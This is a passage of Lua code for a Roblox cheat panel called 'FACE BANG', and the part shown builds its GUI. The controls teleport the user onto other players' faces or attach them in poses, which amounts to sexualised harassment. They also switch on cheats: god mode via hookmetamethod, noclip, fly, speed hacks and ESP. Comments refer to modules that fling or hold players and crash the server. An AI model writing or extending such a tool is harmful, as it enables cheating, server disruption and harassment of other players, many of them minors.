	stroke(win, Theme.hair, 1, 0.25)

	-- animated accent hairline: a gradient border whose colours slide, so the
	-- window edge has motion without any per-frame property writes beyond one
	-- UIGradient.Offset
	local winStroke = new("UIStroke", { Thickness = 1.4, Color = Color3.new(1, 1, 1), Transparency = 0.15 }, win)
	local winGrad = new("UIGradient", {
		Rotation = 45,
		Color = ColorSequence.new({
			ColorSequenceKeypoint.new(0, Theme.accent),
			ColorSequenceKeypoint.new(0.4, Theme.accent2),
			ColorSequenceKeypoint.new(0.7, Theme.accent),
			ColorSequenceKeypoint.new(1, Color3.fromRGB(30, 30, 48)),
		}),
	}, winStroke)
	new("UIGradient", {
		Rotation = 90,
		Color = ColorSequence.new(Theme.panel, Theme.bg),
	}, win)

	-- scale + clamp into the safe area, recomputed on resize / rotation
	local uiScale = new("UIScale", { Scale = 1 }, win)
	local function syncShadows()
		shadowFar.Size = win.Size
		shadow.Size = win.Size
		shadowFar.Position = UDim2.fromOffset(win.Position.X.Offset + 3, win.Position.Y.Offset + 10)
		shadow.Position = UDim2.fromOffset(win.Position.X.Offset + 3, win.Position.Y.Offset + 4)
	end
	local function fitPanel()
		local vp = viewport()
		local pad = 14
		local scale = math.clamp(math.min((vp.X - pad * 2) / BASE_W, (vp.Y - pad * 2) / BASE_H), 0.6, 1)
		uiScale.Scale = scale
		win.Size = UDim2.fromOffset(BASE_W * scale, BASE_H * scale)
		local cur = win.Position
		win.Position = UDim2.fromOffset(
			math.clamp(cur.X.Offset, pad, math.max(pad, vp.X - win.Size.X.Offset - pad)),
			math.clamp(cur.Y.Offset, pad, math.max(pad, vp.Y - win.Size.Y.Offset - pad)))
		syncShadows()
		return scale
	end
	fitPanel()

	--------------------------------------------------------------------- header
	local HEADER_H = 54
	local header = new("Frame", {
		Size = UDim2.new(1, 0, 0, HEADER_H),
		BackgroundColor3 = Theme.panel,
		BorderSizePixel = 0,
		ZIndex = 3,
	}, win)
	corner(header, 16)
	-- square off the bottom corners: header sits flush against the body
	new("Frame", {
		Size = UDim2.new(1, 0, 0, 16),
		Position = UDim2.new(0, 0, 1, -16),
		BackgroundColor3 = Theme.panel,
		BorderSizePixel = 0,
		ZIndex = 3,
	}, header)
	new("UIGradient", {
		Rotation = 90,
		Color = ColorSequence.new(Theme.panel, Theme.bg),
	}, header)
	-- hairline under the header
	new("Frame", {
		Size = UDim2.new(1, -24, 0, 1),
		Position = UDim2.new(0, 12, 1, -1),
		BackgroundColor3 = Theme.hair,
		BackgroundTransparency = 0.35,
		BorderSizePixel = 0,
		ZIndex = 4,
	}, header)

	local brandBar = new("Frame", {
		Size = UDim2.fromOffset(3, 22),
		Position = UDim2.fromOffset(13, 13),
		BackgroundColor3 = Theme.accent,
		BorderSizePixel = 0,
		ZIndex = 4,
	}, header)
	corner(brandBar, 2)
	new("UIGradient", {
		Rotation = 90,
		Color = ColorSequence.new(Theme.accent2, Theme.accent),
	}, brandBar)

	new("TextLabel", {
		Size = UDim2.new(1, -110, 0, 18),
		Position = UDim2.fromOffset(24, 11),
		BackgroundTransparency = 1,
		Text = "FACE BANG",
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Theme.text,
		Font = Enum.Font.GothamBold,
		TextSize = 15,
		ZIndex = 4,
	}, header)

	new("TextLabel", {
		Size = UDim2.new(1, -110, 0, 12),
		Position = UDim2.fromOffset(24, 30),
		BackgroundTransparency = 1,
		Text = "v" .. tostring(VERSION or "1.4.0") .. "  ·  "
			.. (CAP and CAP.name and tostring(CAP.name):sub(1, 18) or "universal"),
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Theme.faint,
		Font = Font,
		TextSize = 9,
		TextTruncate = Enum.TextTruncate.AtEnd,
		ZIndex = 4,
	}, header)

	local dotRing = new("Frame", {
		Size = UDim2.fromOffset(14, 14),
		Position = UDim2.new(1, -84, 0.5, -7),
		BackgroundColor3 = Theme.accent,
		BackgroundTransparency = 0.86,
		BorderSizePixel = 0,
		ZIndex = 4,
	}, header)
	corner(dotRing, 7)

	local stateDot = new("Frame", {
		Name = "StateDot",
		Size = UDim2.fromOffset(7, 7),
		Position = UDim2.new(0.5, -3.5, 0.5, -3.5),
		BackgroundColor3 = Theme.dim,
		BorderSizePixel = 0,
		ZIndex = 5,
	}, dotRing)
	corner(stateDot, 4)

	local hideBtn = new("TextButton", {
		Size = UDim2.fromOffset(28, 26),
		Position = UDim2.new(1, -34, 0.5, -13),
		BackgroundColor3 = Theme.surfaceHi,
		Text = "-",
		TextColor3 = Theme.dim,
		Font = Enum.Font.GothamBold,
		TextSize = 14,
		AutoButtonColor = false,
		BorderSizePixel = 0,
		ZIndex = 4,
	}, header)
	corner(hideBtn, 8)
	stroke(hideBtn, Theme.hair)
	hideBtn.MouseEnter:Connect(function() tweenObj(hideBtn, "TextColor3", Theme.text) end)
	hideBtn.MouseLeave:Connect(function() tweenObj(hideBtn, "TextColor3", Theme.dim) end)

	local dragZone = new("TextButton", {
		Size = UDim2.new(1, -70, 0, HEADER_H),
		BackgroundTransparency = 1,
		Text = "",
		ZIndex = 3,
	}, win)
	local dragStart, dragOrigin, dragging = nil, nil, false
	dragZone.InputBegan:Connect(function(input)
		local t = input.UserInputType
		if t == Enum.UserInputType.MouseButton1 or t == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			dragOrigin = win.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then dragging = false end
			end)
		end
	end)
	conns[#conns + 1] = UserInput.InputChanged:Connect(function(input)
		local t = input.UserInputType
		if not dragging or not dragStart then return end
		if t ~= Enum.UserInputType.MouseMovement and t ~= Enum.UserInputType.Touch then return end
		local d = input.Position - dragStart
		local vp = viewport()
		local pad = 14
		local nx = math.clamp(dragOrigin.X.Offset + d.X, pad, math.max(pad, vp.X - win.Size.X.Offset - pad))
		local ny = math.clamp(dragOrigin.Y.Offset + d.Y, pad, math.max(pad, vp.Y - win.Size.Y.Offset - pad))
		win.Position = UDim2.fromOffset(nx, ny)
		syncShadows()
	end)

	----------------------------------------------------------------- status row
	local statusWrap = new("Frame", {
		Size = UDim2.new(1, -24, 0, 22),
		Position = UDim2.fromOffset(12, HEADER_H + 8),
		BackgroundColor3 = Theme.surface,
		BackgroundTransparency = 0.35,
		BorderSizePixel = 0,
	}, win)
	corner(statusWrap, 7)

	local status = new("TextLabel", {
		Size = UDim2.new(1, -20, 1, 0),
		Position = UDim2.fromOffset(10, 0),
		BackgroundTransparency = 1,
		Text = "idle",
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Theme.dim,
		Font = Font,
		TextSize = 10,
		TextTruncate = Enum.TextTruncate.AtEnd,
	}, statusWrap)

	------------------------------------------------------------------- tab bar
	local tabBar = new("Frame", {
		Size = UDim2.new(1, -24, 0, 30),
		Position = UDim2.fromOffset(12, HEADER_H + 36),
		BackgroundColor3 = Theme.surface,
		BackgroundTransparency = 0.5,
		BorderSizePixel = 0,
	}, win)
	corner(tabBar, 9)
	new("UIListLayout", {
		FillDirection = Enum.FillDirection.Horizontal,
		Padding = UDim.new(0, 3),
		SortOrder = Enum.SortOrder.LayoutOrder,
	}, tabBar)
	new("UIPadding", {
		PaddingLeft = UDim.new(0, 3),
		PaddingRight = UDim.new(0, 3),
		PaddingTop = UDim.new(0, 3),
		PaddingBottom = UDim.new(0, 3),
	}, tabBar)

	local pages = {}
	local tabButtons = {}
	local activeTab

	local pageHost = new("Frame", {
		Size = UDim2.new(1, -20, 1, -(HEADER_H + 76)),
		Position = UDim2.fromOffset(10, HEADER_H + 74),
		BackgroundTransparency = 1,
		ClipsDescendants = true,
	}, win)

	-- tab width is derived from the tab count instead of being hard-coded 0.25:
	-- adding a fifth tab made every label overrun its button at the old width
	local TAB_NAMES = { "Aim", "Poses", "Self", "Players", "Server" }
	local TAB_W = 1 / #TAB_NAMES

	local function mkTab(name, order)
		local b = new("TextButton", {
			Size = UDim2.new(TAB_W, -3, 1, 0),
			BackgroundColor3 = Theme.surface,
			BackgroundTransparency = 1,
			Text = name,
			TextColor3 = Theme.dim,
			Font = Font,
			TextSize = 11,
			AutoButtonColor = false,
			BorderSizePixel = 0,
			LayoutOrder = order,
		}, tabBar)
		corner(b, 7)
		local st = stroke(b, Theme.hair, 1, 1)
		tabButtons[name] = b
		b.MouseEnter:Connect(function()
			if activeTab ~= name then tweenObj(b, "TextColor3", Theme.text) end
		end)
		b.MouseLeave:Connect(function()
			if activeTab ~= name then tweenObj(b, "TextColor3", Theme.dim) end
		end)
		return b, st
	end

	local function mkPage(name)
		local p = new("ScrollingFrame", {
			Name = name .. "Page",
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			BorderSizePixel = 0,
			CanvasSize = UDim2.new(),
			AutomaticCanvasSize = Enum.AutomaticSize.Y,
			ScrollBarThickness = 3,
			ScrollBarImageColor3 = Theme.accent,
			ScrollBarImageTransparency = 0.35,
			Visible = false,
		}, pageHost)
		new("UIListLayout", {
			Padding = UDim.new(0, 6),
			SortOrder = Enum.SortOrder.LayoutOrder,
		}, p)
		new("UIPadding", {
			PaddingLeft = UDim.new(0, 2),
			PaddingRight = UDim.new(0, 6),
			PaddingBottom = UDim.new(0, 10),
		}, p)
		pages[name] = p
		return p
	end

	local function showTab(name)
		activeTab = name
		for n, p in pairs(pages) do
			p.Visible = (n == name)
			if n == name then
				-- slide the new page up into place instead of it appearing
				p.Position = UDim2.fromOffset(0, 6)
				TweenService:Create(p, TweenInfo.new(0.16, Enum.EasingStyle.Quint),
					{ Position = UDim2.fromOffset(0, 0) }):Play()
			end
		end
		for n, b in pairs(tabButtons) do
			local on = (n == name)
			b.BackgroundColor3 = Theme.accent
			b.Font = on and Enum.Font.GothamBold or Font
			TweenService:Create(b, TweenInfo.new(0.16, Enum.EasingStyle.Quint), {
				BackgroundTransparency = on and 0 or 1,
				TextColor3 = on and Theme.text or Theme.dim,
			}):Play()
			local st = b:FindFirstChildOfClass("UIStroke")
			if st then
				TweenService:Create(st, TweenInfo.new(0.16), { Transparency = on and 1 or 0.5 }):Play()
			end
		end
	end

	for i, name in ipairs(TAB_NAMES) do
		local b = mkTab(name, i)
		mkPage(name)
		b.MouseButton1Click:Connect(function() showTab(name) end)
	end

	--------------------------------------------------------------- widgets
	local ROW_H = 40

	-- one row = label on the left, control on the right. 40px tall so it stays a
	-- comfortable touch target at the 0.6 scale floor.
	local function mkRow(page, order)
		local r = new("Frame", {
			Size = UDim2.new(1, 0, 0, ROW_H),
			BackgroundColor3 = Theme.surface,
			BorderSizePixel = 0,
			LayoutOrder = order,
		}, page)
		corner(r, 10)
		stroke(r, Theme.hair, 1, 0.55)
		return r
	end

	-- one-shot press ripple. Kept in a table and aged by the animation loop
	-- instead of task.delay, so it cannot outlive the UI if the panel is torn down.
	local ripples = {}
	local function ripple(row)
		local r = new("Frame", {
			Size = UDim2.fromOffset(14, 14),
			Position = UDim2.new(0.5, -7, 0.5, -7),
			BackgroundColor3 = Theme.accent,
			BackgroundTransparency = 0.55,
			BorderSizePixel = 0,
			ZIndex = row.ZIndex + 1,
		}, row)
		corner(r, 7)
		ripples[#ripples + 1] = { frame = r, t = os.clock() }
	end

	local function mkLabel(row, text)
		return new("TextLabel", {
			Size = UDim2.new(1, -86, 1, 0),
			Position = UDim2.fromOffset(12, 0),
			BackgroundTransparency = 1,
			Text = text,
			TextXAlignment = Enum.TextXAlignment.Left,
			TextColor3 = Theme.text,
			Font = Font,
			TextSize = 12,
			TextTruncate = Enum.TextTruncate.AtEnd,
		}, row)
	end

	-- hover + press feedback shared by every interactive row
	local function rowFeedback(row)
		row.MouseEnter:Connect(function() tweenObj(row, "BackgroundColor3", Theme.surfaceHi) end)
		row.MouseLeave:Connect(function() tweenObj(row, "BackgroundColor3", Theme.surface) end)
	end

	-- a chevron drawn from two bars: ">" glyphs sit too high on some fonts
	local function chevron(row, color)
		local c = new("Frame", {
			Size = UDim2.fromOffset(7, 7),
			Position = UDim2.new(1, -22, 0.5, -3),
			BackgroundTransparency = 1,
		}, row)
		for _, rot in ipairs({ 45, -45 }) do
			local b = new("Frame", {
				Size = UDim2.fromOffset(1.5, 7),
				Position = UDim2.new(0.5, -0.75, 0.5, -3.5),
				AnchorPoint = Vector2.new(0.5, 0.5),
				Rotation = rot - 45,
				BackgroundColor3 = color or Theme.faint,
				BorderSizePixel = 0,
			}, c)
			b.Position = UDim2.new(0.5, -0.75, 0.5, -3.5)
		end
		return c
	end

	-- small caption that groups rows, so the tabs read as sections not a list
	local function section(page, order, text)
		local holder = new("Frame", {
			Size = UDim2.new(1, 0, 0, 18),
			BackgroundTransparency = 1,
			LayoutOrder = order,
		}, page)
		bar(holder, Theme.accent).Position = UDim2.fromOffset(4, 7)
		new("TextLabel", {
			Size = UDim2.new(1, -18, 1, 0),
			Position = UDim2.fromOffset(12, 0),
			BackgroundTransparency = 1,
			Text = string.upper(text),
			TextXAlignment = Enum.TextXAlignment.Left,
			TextColor3 = Theme.faint,
			Font = Enum.Font.GothamBold,
			TextSize = 9,
		}, holder)
		return holder
	end

	-- action row: tap to fire
	local function action(page, order, label, fn)
		local row = mkRow(page, order)
		mkLabel(row, label)
		chevron(row, Theme.faint)
		local btn = new("TextButton", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = "",
		}, row)
		rowFeedback(row)
		btn.MouseButton1Down:Connect(function()
			row.BackgroundColor3 = Theme.surfacePress
			ripple(row)
		end)
		btn.MouseButton1Up:Connect(function() row.BackgroundColor3 = Theme.surfaceHi end)
		btn.MouseButton1Click:Connect(function()
			local ok, err = pcall(fn)
			if not ok then out("error: " .. tostring(err)) end
		end)
		return row
	end

	-- toggle row: pill with a knob that slides and colours in
	local function toggle(page, order, label, onChange, initial)
		local row = mkRow(page, order)
		mkLabel(row, label)
		local pill = new("Frame", {
			Size = UDim2.fromOffset(40, 22),
			Position = UDim2.new(1, -52, 0.5, -11),
			BackgroundColor3 = initial and Theme.good or Theme.surfaceHi,
			BorderSizePixel = 0,
		}, row)
		corner(pill, 11)
		stroke(pill, Theme.hair, 1, initial and 1 or 0.6)
		local knob = new("Frame", {
			Size = UDim2.fromOffset(16, 16),
			Position = UDim2.fromOffset(initial and 21 or 3, 3),
			BackgroundColor3 = initial and Color3.new(1, 1, 1) or Theme.dim,
			BorderSizePixel = 0,
		}, pill)
		corner(knob, 8)

		local state = initial and true or false
		local btn = new("TextButton", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = "",
		}, row)
		rowFeedback(row)
		local function paint(animate)
			local t = animate == false and 0.001 or 0.14
			tweenObj(pill, "BackgroundColor3", state and Theme.good or Theme.surfaceHi, t)
			tweenObj(knob, "BackgroundColor3", state and Color3.new(1, 1, 1) or Theme.dim, t)
			local goal = UDim2.fromOffset(state and 21 or 3, 3)
			if animate == false then
				knob.Position = goal
			else
				TweenService:Create(knob, TweenInfo.new(t, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = goal }):Play()
			end
		end
		btn.MouseButton1Click:Connect(function()
			state = not state
			paint(true)
			local ok, err = pcall(onChange, state)
			if not ok then out("error: " .. tostring(err)) end
		end)
		return { set = function(v) state = v paint(false) end, get = function() return state end }
	end

	-- stepper row: tap the value chip to cycle through a list of values
	local function stepper(page, order, label, values, onPick, initialIndex)
		local row = mkRow(page, order)
		mkLabel(row, label)
		local idx = initialIndex or 1
		local chip = new("TextButton", {
			Size = UDim2.fromOffset(64, 24),
			Position = UDim2.new(1, -76, 0.5, -12),
			BackgroundColor3 = Theme.surfaceHi,
			Text = tostring(values[idx]),
			TextColor3 = Theme.text,
			Font = Enum.Font.GothamMedium,
			TextSize = 11,
			AutoButtonColor = false,
			BorderSizePixel = 0,
		}, row)
		corner(chip, 7)
		stroke(chip, Theme.hair, 1, 0.7)
		chip.MouseEnter:Connect(function() tweenObj(chip, "BackgroundColor3", Theme.accentSoft) end)
		chip.MouseLeave:Connect(function() tweenObj(chip, "BackgroundColor3", Theme.surfaceHi) end)
		chip.MouseButton1Click:Connect(function()
			idx = idx % #values + 1
			chip.Text = tostring(values[idx])
			local ok, err = pcall(onPick, values[idx])
			if not ok then out("error: " .. tostring(err)) end
		end)
		return chip
	end

	-- forward-declared: assigned while building the Aim tab, read by UI.state
	local bangLabel, loopToggle, bangGlow

	-- destructive rows need a second tap; the armed state expires so a stray
	-- tap never leaves something dangerous primed
	local function actionConfirm(page, order, label, fn)
		local row = mkRow(page, order)
		local text = mkLabel(row, label)
		local ch = chevron(row, Theme.faint)
		local armed, token = false, 0
		local btn = new("TextButton", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = "",
		}, row)
		rowFeedback(row)
		local function disarm()
			armed = false
			text.Text = label
			text.TextColor3 = Theme.text
			tweenObj(row, "BackgroundColor3", Theme.surface)
			for _, b in ipairs(ch:GetChildren()) do
				if b:IsA("Frame") then tweenObj(b, "BackgroundColor3", Theme.faint) end
			end
		end
		btn.MouseButton1Click:Connect(function()
			if not armed then
				armed = true
				token += 1
				local mine = token
				text.Text = "tap again to confirm"
				text.TextColor3 = Theme.bad
				row.BackgroundColor3 = Theme.surfacePress
				for _, b in ipairs(ch:GetChildren()) do
					if b:IsA("Frame") then b.BackgroundColor3 = Theme.bad end
				end
				task.delay(3, function()
					if armed and token == mine then disarm() end
				end)
				return
			end
			disarm()
			local ok, err = pcall(fn)
			if not ok then out("error: " .. tostring(err)) end
		end)
		return row
	end

	------------------------------------------------------------------- Aim tab
	local aim = pages.Aim
	local aimOrder = 0
	local function aimRow(...) aimOrder += 1 return aimOrder, ... end

	do
		local o, _ = aimRow()
		local row = new("Frame", {
			Size = UDim2.new(1, 0, 0, 48),
			BackgroundColor3 = Theme.accent,
			BorderSizePixel = 0,
			LayoutOrder = o,
		}, aim)
		corner(row, 12)
		new("UIGradient", {
			Rotation = 20,
			Color = ColorSequence.new(Theme.accent, Theme.accent2),
		}, row)
		local priStroke = stroke(row, Theme.accent2, 1, 0.35)

		local glow = new("Frame", {
			Size = UDim2.new(1, -8, 0, 10),
			Position = UDim2.new(0, 4, 1, -4),
			BackgroundColor3 = Theme.accent,
			BackgroundTransparency = 0.72,
			BorderSizePixel = 0,
		}, row)
		corner(glow, 5)
		bangGlow = glow

		local b = new("TextButton", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = "",
		}, row)
		bangLabel = new("TextLabel", {
			Size = UDim2.fromScale(1, 1),
			BackgroundTransparency = 1,
			Text = "BANG NEAREST",
			TextColor3 = Color3.new(1, 1, 1),
			Font = Enum.Font.GothamBold,
			TextSize = 14,
		}, row)

		local scale = new("UIScale", { Scale = 1 }, row)
		b.MouseEnter:Connect(function()
			tweenObj(row, "BackgroundColor3", Color3.fromRGB(163, 122, 255))
		end)
		b.MouseLeave:Connect(function()
			tweenObj(row, "BackgroundColor3", Theme.accent)
			TweenService:Create(scale, TweenInfo.new(0.1), { Scale = 1 }):Play()
		end)
		b.MouseButton1Down:Connect(function()
			ripple(row)
			TweenService:Create(scale, TweenInfo.new(0.08), { Scale = 0.97 }):Play()
		end)
		b.MouseButton1Up:Connect(function()
			TweenService:Create(scale, TweenInfo.new(0.1), { Scale = 1 }):Play()
		end)
		b.MouseButton1Click:Connect(function() Engine.toggle() end)
	end

	loopToggle = toggle(aim, 2, "loop (auto-retarget)", function(on)
		Engine.loop = on
		if on and not Engine.running then Engine.start() end
		if not on and Engine.running then Engine.stop() end
	end, false)

	action(aim, 3, "stop", function()
		Engine.stop()
		loopToggle.set(false) -- Engine.stop clears loop; the pill must follow
	end)

	section(aim, 4, "motion")

	stepper(aim, 5, "bang motion", { "on the face", "visual only" }, function(v)
		Config.Motion = (v == "on the face") and "teleport" or "visual"
		out("motion: " .. v)
	end, 1)

	stepper(aim, 6, "back off", { 2, 4, 6, 9 }, function(v) Config.Stage = v end, 2)

	stepper(aim, 7, "rate (every Nth pass)", { 1, 2, 3, 4 }, function(v) Config.MotionRate = v end, 1)

	toggle(aim, 8, "return me on stop", function(on) Config.ReturnOnStop = on end, true)

	section(aim, 9, "effect (all off by default)")

	stepper(aim, 10, "style", { "none", "nova", "shockwave", "glitch", "flame" }, function(v)
		Config.FXStyle = v
		out("effect: " .. v)
	end, 1)

	stepper(aim, 11, "size", { 1.0, 1.6, 2.4, 3.5 }, function(v) Config.FXScale = v end, 2)

	stepper(aim, 12, "pulse", { 0.06, 0.12, 0.2, 0.35, 0.6 }, function(v) Config.FXPulse = v end, 2)

	toggle(aim, 13, "BANG!! text + hit count", function(on) Config.FXText = on end, false)
	toggle(aim, 14, "impact sound", function(on) Config.FXSound = on end, false)
	toggle(aim, 15, "screen kick", function(on) Config.FXShake = on end, false)
	toggle(aim, 16, "outline the target", function(on) Config.FXMarker = on end, false)

	---------------------------------------------------------------- Poses tab
	--[[
	  The attach/pose family from the reference tool, but every pose shares one
	  movement core and one offset editor (see poses.lua). The old tool hard-coded
	  its distances; here distance, height and facing are live-steppable and can be
	  changed while the pose is active, so you tune it while watching it.
	]]
	local poPage = pages.Poses
	local poo = 0
	local function poOrder() poo += 1 return poo end

	local poseLockToggle
	local poseEditorRows = {}   -- rebuilt when the active pose changes
	local poseEditorHost

	local function refreshPoseEditor()
		for _, r in ipairs(poseEditorRows) do
			if r and r.Destroy then pcall(function() r:Destroy() end) end
		end
		table.clear(poseEditorRows)
		local key = Poses.active()
		if not key or not poseEditorHost then return end
		local o = Poses.getOffset(key)
		if not o then return end

		-- label showing which pose is being edited
		poseEditorRows[#poseEditorRows + 1] = section(poseEditorHost, 1, "tuning: " .. Poses.label(key))

		poseEditorRows[#poseEditorRows + 1] = stepper(poseEditorHost, 2, "facing",
			{ "front", "back", "left", "right" }, function(v)
				Poses.setOffset(key, "facing", v)
				out("pose facing: " .. v)
			end, 1)

		poseEditorRows[#poseEditorRows + 1] = stepper(poseEditorHost, 3, "distance",
			{ 0.5, 1, 1.6, 2.2, 2.8, 3.5, 5 }, function(v)
				Poses.setOffset(key, "distance", v)
			end, 5)

		poseEditorRows[#poseEditorRows + 1] = stepper(poseEditorHost, 4, "height",
			{ -1.5, -0.6, 0, 1.2, 1.8, 2.6, 3.2 }, function(v)
				Poses.setOffset(key, "height", v)
			end, 3)
	end

	section(poPage, poOrder(), "attach to selected player")

	for _, key in ipairs(Poses.keys()) do
		action(poPage, poOrder(), Poses.label(key), function()
			local p = pick()
			if not p then out("select a player first") return end
			local ok, err = Poses.apply(key, p)
			out(ok and (Poses.label(key) .. " on " .. p.Name) or tostring(err))
			refreshPoseEditor()
		end)
	end

	action(poPage, poOrder(), "release pose", function()
		Poses.release()
		refreshPoseEditor()
		out("pose released")
	end)

	section(poPage, poOrder(), "settings")

	poseLockToggle = toggle(poPage, poOrder(), "lock facing (do not spin with them)", function(on)
		Poses.setLockFacing(on)
		out(on and "facing locked" or "facing follows target")
	end, false)

	-- AutomaticSize Y is required here: the editor rows are rebuilt when the
	-- active pose changes, so a fixed height would either clip them or leave a
	-- gap. Without it the host stays 12px tall and the controls are invisible.
	poseEditorHost = new("Frame", {
		Size = UDim2.new(1, 0, 0, 0),
		AutomaticSize = Enum.AutomaticSize.Y,
		BackgroundTransparency = 1,
		LayoutOrder = poOrder(),
	}, poPage)
	new("UIListLayout", { Padding = UDim.new(0, 6), SortOrder = Enum.SortOrder.LayoutOrder }, poseEditorHost)

	------------------------------------------------------------------ Self tab
	local selfPage = pages.Self
	local so = 0
	local function sOrder() so += 1 return so end

	local ghostToggle = toggle(selfPage, sOrder(), "GHOST - invisible + invincible", function(on)
		local ok, err = SelfTools.ghost(on)
		if not ok and err then out(err) end
		if ok then out(on and "ghost on" or "ghost off") end
	end, false)

	action(selfPage, sOrder(), "fix my character (reset physics)", function()
		Targets.thawAll()
		Targets.unfling()
		Targets.unweld()
		SelfTools.resetPhysics()
		out("character reset")
	end)

	section(selfPage, sOrder(), "protection")

	--[[
	  STRICT god mode is opt-in because installing it is what made the game lag:
	  hookmetamethod has no per-instance form, so the wrapper runs on every method
	  call in the whole game. The default god mode blocks nothing and needs nothing.
	]]
	toggle(selfPage, sOrder(), "strict god (hooks - can lag)", function(on)
		Config.GodStrict = on
		if SelfTools.isGod() then SelfTools.godMode(true) end
		out(on and "strict god: hooks installed" or "strict god: off")
	end, false)

	local godToggle = toggle(selfPage, sOrder(), "GOD MODE (un-killable)", function(on)
		-- never call restoreAll() here: turning god off used to wipe speed, noclip,
		-- fly and every other toggle as a side effect, and the row looked broken
		local ok = SelfTools.godMode(on)
		out(on and "god mode on (health pinned, damage blocked)" or "god mode off")
		if not ok then out("god mode unavailable") end
	end, false)

	local noclipToggle = toggle(selfPage, sOrder(), "noclip", function(on) SelfTools.noclip(on) end, false)

	local flyToggle = toggle(selfPage, sOrder(), "fly (wasd / space)", function(on)
		local ok, err = SelfTools.fly(on, ctx.flySpeed or 60)
		if not ok and err then out(err) end
	end, false)

	section(selfPage, sOrder(), "movement")

	stepper(selfPage, sOrder(), "fly speed", { 30, 60, 100, 160, 240 }, function(v) ctx.flySpeed = v end, 2)

	toggle(selfPage, sOrder(), "fly pose (superman)", function(on)
		Config.FlyPose = on
		if SelfTools.isFlying and SelfTools.isFlying() then
			-- apply or drop the pose immediately instead of waiting for a re-fly
			if on then pcall(SelfTools.poseCapture) else pcall(SelfTools.poseRelease) end
		end
	end, false)

	toggle(selfPage, sOrder(), "fly fx (trail, thrust, aura)", function(on)
		Config.FlyFX = on
		if not on then
			FX.flyStop()
		elseif flyToggle.get() then
			FX.flyStart()
		end
	end, false)
	local godSpeedToggle = toggle(selfPage, sOrder(), "GOD SPEED (pinned each frame)", function(on)
		SelfTools.godSpeed(on, ctx.godSpeedValue or 500)
	end, false)

	stepper(selfPage, sOrder(), "god speed value", { 200, 500, 1000, 2000, 4000 }, function(v)
		ctx.godSpeedValue = v
		if godSpeedToggle.get() then SelfTools.godSpeed(true, v) end
	end, 2)

	stepper(selfPage, sOrder(), "walk speed", { 16, 30, 50, 80, 120, 200 }, function(v) SelfTools.setSpeed(v) end, 1)
	stepper(selfPage, sOrder(), "jump power", { 50, 75, 100, 150, 250 }, function(v) SelfTools.setJump(v) end, 1)

	toggle(selfPage, sOrder(), "infinite jump", function(on) SelfTools.infiniteJump(on) end, false)

	section(selfPage, sOrder(), "vision / esp")

	local espToggle = toggle(selfPage, sOrder(), "ESP (name + distance)", function(on)
		Tools.esp(on)
		out(on and "ESP on" or "ESP off")
	end, false)

	toggle(selfPage, sOrder(), "ESP box", function(on)
		Tools.setEspOption("box", on)
	end, false)

	toggle(selfPage, sOrder(), "ESP distance", function(on)
		Tools.setEspOption("distance", on)
	end, true)

	toggle(selfPage, sOrder(), "fullbright (restores on off)", function(on)
		Tools.fullbright(on)
		out(on and "brighter" or "lighting restored")
	end, false)

	toggle(selfPage, sOrder(), "click to teleport", function(on)
		Tools.clickTeleport(on)
		out(on and "click the ground to move" or "click teleport off")
	end, false)

	section(selfPage, sOrder(), "music / backdrop")

	--[[
	  These three control the panel's own media, and they work whether or not you
	  set a MusicId / BG_VideoId: mute and pause are real switches over a real
	  Sound and VideoFrame, not cosmetic rows. With no asset configured they
	  still toggle state and report it, so nothing lies about being on.
	]]
	local musicMuteToggle, musicPauseToggle

	musicMuteToggle = toggle(selfPage, sOrder(), "mute music", function(on)
		Bg.mute(on)
		out(on and "music muted" or "music on")
	end, Config.MusicMuted == true)

	musicPauseToggle = toggle(selfPage, sOrder(), "pause backdrop video", function(on)
		local p = Bg.setPaused(on)
		out(p and "backdrop paused" or "backdrop playing")
	end, false)

	stepper(selfPage, sOrder(), "music volume", { 0, 0.15, 0.35, 0.6, 1 }, function(v)
		Bg.setVolume(v)
		out("volume " .. tostring(v))
	end, 3)

	section(selfPage, sOrder(), "teleport")

	action(selfPage, sOrder(), "teleport to cursor", function()
		local ok, res = SelfTools.teleportToCursor(3)
		out(ok and "teleported" or tostring(res))
	end)

	action(selfPage, sOrder(), "save position", function()
		local ok, err = SelfTools.savePosition()
		out(ok and "position saved" or tostring(err))
	end)

	action(selfPage, sOrder(), "load position", function()
		local ok, err = SelfTools.loadPosition()
		out(ok and "loaded" or tostring(err))
	end)

	local voidToggle = toggle(selfPage, sOrder(), "anti void", function(on)
		if on then SelfTools.startAntiVoid(Config.VoidFloor) else SelfTools.stopAntiVoid() end
	end, false)

	stepper(selfPage, sOrder(), "void floor Y", { -40, -80, -150, -300 }, function(v) Config.VoidFloor = v end, 2)

	local invisToggle = toggle(selfPage, sOrder(), "invisible (your view only)", function(on) SelfTools.invisible(on) end, false)

	toggle(selfPage, sOrder(), "anti afk", function(on) SelfTools.antiAfk(on) end, false)

	toggle(selfPage, sOrder(), "freeze my character (local)", function(on) SelfTools.freezeLocal(on) end, false)

	actionConfirm(selfPage, sOrder(), "restore everything", function()
		SelfTools.restoreAll()
		Engine.stop()
		Targets.cleanup()
		-- grip and crash are not part of the character state restoreAll knows
		-- about, so a "restore everything" that skipped them left players held and
		-- the FB_Load folder behind
		pcall(function() Grip.stop() end)
		pcall(function() Crash.stop() end)
		out("restored")
	end)

	--------------------------------------------------------------- Players tab
	local plPage = pages.Players
	local plOrder = 0

	local selectedLabel = new("TextLabel", {
		Size = UDim2.new(1, 0, 0, 16),
		BackgroundTransparency = 1,
		Text = "select a player below",
		TextXAlignment = Enum.TextXAlignment.Left,
		TextColor3 = Theme.dim,
		Font = Font,
		TextSize = 10,
		LayoutOrder = 0,
	}, plPage)

	local playerList = new("Frame", {
		Size = UDim2.new(1, 0, 0, 150),
		BackgroundColor3 = Theme.panel,
		BorderSizePixel = 0,
		LayoutOrder = 1,
	}, plPage)
	corner(playerList, 7)
	local plScroll = new("ScrollingFrame", {
